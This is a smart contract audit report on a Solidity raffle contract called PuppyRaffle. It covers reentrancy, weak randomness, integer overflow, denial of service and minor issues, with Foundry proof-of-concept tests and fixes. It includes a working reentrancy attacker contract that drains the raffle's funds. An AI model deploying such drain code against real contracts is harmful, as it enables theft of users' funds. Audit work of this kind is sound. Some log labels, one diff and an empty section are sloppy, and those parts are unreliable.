## Highs

### [H-1]: Reentrancy attack in `PuppyRaffle:refund` allows entrant to drain raffle balance.

**Description:** The `PuppyRaffle::refund` does not follow CEI (Checks, Effect, Interactions) and as a result enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```js
function refund(uint256 playerIndex) public {
    //written-skipped MEV
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. This cycle could continue till the contract balance is drained. 

**Impact:** All fees paid by a raffle entrant could be stolen by a malicious participant.

**Proof of Concept:**
1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls the `PuppyRaffle:refund` function from their contract draining the contract balance.

**Proof of Code:**
<details>
<summary>Code</summary>

Place the following intoC `PuppyRaffle.t.sol`:

```js
function test_ReentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attackUser = makeAddr("attackUser");
    vm.deal(attackUser, 1 ether);

    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingVictimContractBalance = address(puppyRaffle).balance;

    vm.prank(attackUser);
    attackerContract.attack{value: entranceFee}();

    console.log("Starting attacker contract balance: ", startingAttackContractBalance);
    console.log("Starting attacker contract balance: ", startingVictimContractBalance);
    
    console.log("Ending attacker contract balance: ", address(attackerContract).balance);
    console.log("Ending attacker contract balance: ", address(puppyRaffle).balance);
}
```
And this contract as well

```js
    contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyraffle) {
        puppyRaffle = _puppyraffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```
</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle:refund` function update the players array before making the external call. Additionally, we should move the event emission up as well.

```diff
 function refund(uint256 playerIndex) public {
    //written-skipped MEV
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // @audit Reentrancy
 
+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
    payable(msg.sender).sendValue(entranceFee);

-    players[playerIndex] = address(0);
-    emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows user to influence or select winner and winning puppy. 

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together can create a predictable number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

*Note:** This additionally means that users could front-run this function and call `refund` and call refund if they see they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the rarest puppy. Making the entire raffle worthless if it becomes a gas war as to wins the raffle.

**Proof of Concept:**

1. Validators can know ahead of the time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate. See the Solidity doc on [Prevrandao]. `block.difficulty` was previously replaced with Prevrandao. 
2. Users can mine/manipulate their `msg.sender`value to result in their address being used to generate the winner. 
3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy. 

Using on-chain value as a randomness seed is a [well-known attack vector](https://medium.com/better-programming/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf#:~:text=A%20request%20for%20a%20random,generate%20the%20resulting%20random%20number.) in the blockchain space.

**Recommended Mitigation:** Consider using a cryptographically provable random number generator like [Chainlink VRF](https://docs.chain.link/vrf).

### [H-3]: Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In Solidity, versions prior to `0.8.0` were subject to integer overflows. 

```js
uint64 myVar = type(uint64).max;
// output: 18446744073709551615
myVar = myVar + 1;
// myVar will be 0
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyAddress:withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving the fees forever stuck in the contract.

**Proof of Concept:** 

1. We conclude a raffle of 4 players 
2. We then enter a new raffle again with 89 players
3. `totalFees` will be:

```js
totalFees += uint64(fees);
totalFees = 8000000000000000000 + 178000000000000
// and this will overflow
// totalFees = an overflown fee
```
4. Finally, you will not be able to withdraw, due to the line below in `PuppyRaffle::withdrawFees`:

```js
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
Although you could use `selfdestruct` to send eth to the contract to match the totalFees and withdraw the fees, this is clearly not the intended design of the protocol. As some point, there'll be too much `balance` in the contract that the above require statement will be impossible to hit.


<details>
<summary>Code</summary>

```js
    function testTotalFeesArithmeticOverflow() public playersEntered {
        vm.warp(block.timestamp + duration);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        uint256 startingTotalFees = puppyRaffle.totalFees();
        console.log("starting total fees: ", startingTotalFees);
        //we then have 89 players enter the raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for(uint256 i = 0; i < 89; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);

        vm.warp(block.timestamp + duration);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fee: ", endingTotalFees);

        assert(endingTotalFees < startingTotalFees);

        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```
</details>

**Recommended Mitigations:** There are few recommended mitigations.
1. Use a newer version of solidity, and a `uint256` instead of `uint64` for `puppyRaffle::totalFees`.
2. You could use the `safeMath` library of Openzeppelin for version 0.7.6 of solidity, however you'll still have a problem with `uint64` type if too many fees are collected. 
3. Remove the balance check from `PuppyRaffle:withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
There are more attack vectors associated with that require check so we recommend removing it regardless.

## Medium

### [M-1]: Looping through the players array to check for duplicates in `PupyyRaffle::enterRaffle` is a potential denial of service attack, incrementing gas costs for future entrants

**Description:** The `puppyRaffle:enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be automatically lower than those who enter later. Every additional address in the players array is an additional check the loop will have to make.

```js
// @audit DoS
@>   for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact:** The gas costs for raffle entrants will greatly increase as players enter the raffle. Discouraging later users from entering, and causing a rush at the start of the raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big that no one else enters, guaranteeing themselves the win.

**Proof of concept:** If we have to sets of 100 players, the gas costs will be as such:
- First 100 players: 6252048 gas
- First 100 players: 18068138 gas

The second code is more than 3x the first cost.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffle.t.sol`

```js
function testDenialOfService() public  {
        // declare the first 100 players
    vm.txGasPrice(1);
    uint256 playersNum = 100;
    address[] memory players = new address[](playersNum); //reserve space for 100 elements

    for(uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
    uint256 gasEnd = gasleft();

    uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
    console.log("Gas cost for the first 100 player", gasUsedFirst);

    // second entry
    address[] memory playersTwo = new address[](playersNum); //reserve space for another 100 players
    for(uint256 i = 0; i < playersNum; i++) {
        playersTwo[i] = address(i + 100);
    }
    uint256 gasStartTwo = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);
    uint256 gasEndTwo = gasleft();

    uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
    console.log("Gas cost for the first 100 player", gasUsedSecond);

    assert(gasUsedSecond > gasUsedFirst);
}
```
</details>

**Recommended mitigation:**

1. Consider allowing duplicates. Users can create new wallet addresses anyway, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check for duplicates. This will allow constant time lookup of whether a user has already entered. 

```diff
+ mapping (address => uint256) public addressToRaffleId;
+ uint256 public raffleId = 0;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);       
+       addressToRaffleId[newPlayers[i]] = raffleId;
    }

-      // Check for duplicates
+   // check for duplicates only from the new players
+   // for (uint256 i = 0; i < newPlayers.length; i++) {
+   require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle duplicate player");
+   }
    // @audit DoS
-    for (uint256 i = 0; i < players.length - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
-            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-        }
-        }
        emit RaffleEnter(newPlayers);
    }

function selectWinner() external {
+  raffleId += 1;
   require(block.timestamp >= raffleStartTime + raffleDuration, "Raffle not over";)
}
```

Alternatively, you could use Openzeppelin `EnumerableSet` library

### [M-2] Unsafe Cast of `PuppyRaffle::fee` loses fee

### [M-3] Smart Contracts wallets raffle without a `fallback` or a `receive` function will block the start of a new contest. 

**Description:** The `PuppyRaffle::selectWinner` is responsible for resetting the lottery. However, if the winner is a smart contract wallet, the lottery won't be able to restart. 

Users could easily call the `PuppyRaffle::selectWinner` function again, and non-wallets entrants could enter, but could cost a lot due to the duplicate check and a lottery reset could get very challenging.

**Impact:** The `puppyRaffle::selectWinner` could revert many times making the lottery reset difficult. 

Also, true winners would not get paid out and someone else could take their money.

**Proof of concept:**

1. 10 smart contract wallets without a fallback or receive function enter the raffle
2. The lottery ends
3. The `selectWinner` wouldn't work even though the lottery was over

**Recommended Mitigation:** There are few options to mitigate this issue. 
1. Don't allow smart contracts entrants (not recommended)
2. Create a mapping of addresses -> payout amounts so winners can pull their funds out themselves with a new `claimPrize` function, putting the owness on the winner to claim their prize (recommended)

> This approach is known as pull over push

## Lows

### [L-1]: `PuppyRaffle::getPlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle.

**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```js
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    // @audit if a player is not non-existent in the players array, this will return 0, which could also mean the player is at index 0
    // @audit if a player is active but at index 0, this could also mean the player is not active
    return 0;
    }
```


**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and may attempt to enter the raffle again, thereby wasting gas. 

**Proof of Concept:**
1. User enter the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly, due to the functions documentation. 

**Recommended Mitigation:** The easiest recommendation is to revert if the player is not in the array instead of returning 0. You could also reserve the 0th position for any competition, but a better solution might be to return `int256` where the variable returns `-1` for inactive players. 

## Gas

### [G-1]: Unchanged state variables should be declared constant or immutable

Reading from storage is much more expensive than reading from constant or immutable variables.
Instances:
- `PuppyRaffle::raffleDuration`,`PuppyRaffle: raffleStartTime`, and  should be immutable.
- `PuppyRaffle::commonImageUri`,`PuppyRaffle: rareImageUri`, and  should be constant.


### [G-2]: Storage variables in a loop should be cached

Every time you call `players.length` you read from storage, as opposed to memory which is more gas efficient.

```diff
+ uint256 playersLength = players.length;

- for (uint256 i = 0; i < players.length - 1; i++) {
+ for (uint256 i = 0; i < playersLength - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

## Informational

### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

</details>

### [I-2]: Using outdated versions of solidity is not recommended. 

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

See [Slither Documentation](#https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) for more information.

### [I-3]: Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>

- Found in src/PuppyRaffle.sol [Line: 65](src/PuppyRaffle.sol#L65)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 203](src/PuppyRaffle.sol#L203)

	```solidity
	        feeAddress = newFeeAddress;
	```

</details>

### [I-4]: `PuppyRaffle::selectWinner` should follow CEI, which is not best practice. 

It is best to keep code clean and follow CEI

```diff
-    (bool success,) = winner.call{value: prizePool}("");
-    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
+    (bool success,) = winner.call{value: prizePool}("");
+    require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5]: Use of magic numbers is discouraged. 

It can be confusing to see number literals in a codebase and its much more readable if the numbers are given a name.

Examples:

```diff
+    // uint256 PRICEPOOL_PERCENTAGE = 80;
+    // uint256 FEE_PERCENTAGE = 20;
+    // uint256 POOL_PRECISON = 100;
```